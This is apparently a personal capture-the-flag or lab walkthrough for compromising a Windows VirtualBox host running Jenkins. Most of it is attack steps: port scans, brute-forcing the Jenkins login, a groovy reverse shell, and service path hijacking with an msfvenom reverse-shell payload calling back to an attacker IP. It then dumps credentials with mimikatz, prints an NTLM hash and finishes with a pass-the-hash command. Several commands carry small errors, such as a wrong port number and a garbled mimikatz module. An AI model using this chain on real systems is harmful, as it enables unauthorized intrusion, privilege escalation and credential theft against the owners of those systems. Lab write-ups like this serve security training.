### nmap -vv -sS -Pn -oN 10.0.2.80_ports.nmap -p- 10.0.2.80

135/tcp open msrpc syn-ack ttl 128  
139/tcp open netbios-ssn syn-ack ttl 128  
445/tcp open microsoft-ds syn-ack ttl 128  
5040/tcp open unknown syn-ack ttl 128  
7680/tcp open pando-pub syn-ack ttl 128  
8080/tcp open http-proxy syn-ack ttl 128  
49664/tcp open unknown syn-ack ttl 128  
49665/tcp open unknown syn-ack ttl 128  
49666/tcp open unknown syn-ack ttl 128  
49667/tcp open unknown syn-ack ttl 128  
49668/tcp open unknown syn-ack ttl 128  
49669/tcp open unknown syn-ack ttl 128
 
### nmap -vv -sC -sV --script=vuln -oN 10.0.2.80_svcs.nmap -p 135,139,445,5040,7680,8080 10.0.2.80

35/tcp open msrpc syn-ack ttl 128 Microsoft Windows RPC  
139/tcp open netbios-ssn syn-ack ttl 128 Microsoft Windows netbios-ssn  
445/tcp open microsoft-ds? syn-ack ttl 128  
5040/tcp open unknown syn-ack ttl 128  
7680/tcp open pando-pub? syn-ack ttl 128  
8080/tcp open http syn-ack ttl 128 Jetty 9.4.41.v20210516  
|_ /robots.txt: Robots file  
MAC Address: 08:00:27:FA:0B:C5 (Oracle VirtualBox virtual NIC)  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
## Nessus

Jenkins Open Source LTS 2.289.3
 
## 8080

[http://10.0.2.80:8080/386/keylogger/1249.db](http://10.0.2.80:8080/386/keylogger/1249.db)
 
GET /386/keylogger/1249.db HTTP/1.1  
Host: 10.0.2.80:8080  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Connection: close  
Upgrade-Insecure-Requests: 1  
Cache-Control: max-age=0
 
## Burp Suite

Brute force the login username and password (clusterbomb)  
Payload 1 - usernames  
Payload 2 - passwords  
jenkins:jenkins
 
Login
 
Google search for authenticated jenkins attacks
 
Nav to /script
 
Search groovy reverse shell
 
Get shell
 
Winpeas  
OR  
Look in Downloads, google the wise assistant executable  
Vuln to path injection
 
### wmic service where 'name like "%WiseBootAssistant%"' get displayname, pathname, startmode, startname

### sc qc "WiseBootAssistant"
 
Make reverse shell with msfvenom, upload to target, rename Wise
 
### msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4445 -f exe-service -o Wise
 
Stop/start service

### Sc stop WiseBootAssistant

### Sc start WiseBootAssistant
 
NT AUTHORITY/SYSTEM shell
 
Get mimikatz  
Dump hashes
 
### Privilege::debug

### Lsadump::sam

### Sekurlsa::mvs
 
==User : Administrator==  
==Hash NTLM: 06aeec76975c06fdeaf9570f0de19154==
 
### Netstat to find DC
 
## Pass the hash

sekurlsa::pth /user:Administrator /domain:192.168.1.1 /ntlm:06aeec76975c06fdeaf9570f0de19154 /run:"cmd.exe"